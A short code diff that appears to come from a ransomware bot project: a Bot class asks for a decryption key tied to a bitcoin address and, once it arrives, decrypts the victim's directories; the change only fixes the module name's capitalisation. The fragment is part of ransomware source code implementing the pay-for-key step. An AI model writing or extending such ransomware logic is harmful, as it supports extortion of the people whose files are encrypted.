@@ -69,7 +69,7 @@ class Bot(object):
             if self.ransom:
                 got_key = self.request_key(btc_addr)
                 if got_key:
-                    Ransomware.decrypt_all_dir(got_key)
+                    ransomware.decrypt_all_dir(got_key)
                     self.ransom = False
 
 
